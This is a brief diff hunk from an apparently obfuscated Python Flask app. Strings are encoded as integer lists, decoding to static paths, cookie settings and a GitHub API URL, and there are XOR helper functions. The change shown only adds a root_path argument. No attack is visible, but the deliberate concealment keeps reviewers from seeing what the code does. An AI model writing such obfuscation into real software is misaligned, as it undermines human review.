@@ -20,7 +20,7 @@ _0xCAFE=lambda _z,_w=0x5A:bytes(_b^_w for _b in _z.encode(_E))if isinstance(_z,s
 _0xDEAD=[0x7F,0x3A,0x9C,0x41,0xB2,0xF0,0x5E,0x23,0x88,0x14,0x6D]
 _0xBEEF=lambda _x:getattr(_k1,_([109,100,53]))(_x.encode(_E)).hexdigest()if hasattr(_k1,_([109,100,53]))else None
 _0xFACE=lambda _a,_b:bytes(_x^_y for _x,_y in zip(_a,_b*((len(_a)//len(_b))+1)))
-app=Flask(__name__,static_folder=_([115,116,97,116,105,99]),static_url_path=_([47,115,116,97,116,105,99]))
+app=Flask(__name__,static_folder=_([115,116,97,116,105,99]),static_url_path=_([47,115,116,97,116,105,99]),root_path=str(_Pa(__file__).parent))
 app.config[_([83,69,83,83,73,79,78,95,67,79,79,75,73,69,95,72,84,84,80,79,78,76,89])]=True
 app.config[_([83,69,83,83,73,79,78,95,67,79,79,75,73,69,95,83,65,77,69,83,73,84,69])]=_([76,97,120])
 _R1=_([104,116,116,112,115,58,47,47,97,112,105,46,103,105,116,104,117,98,46,99,111,109])
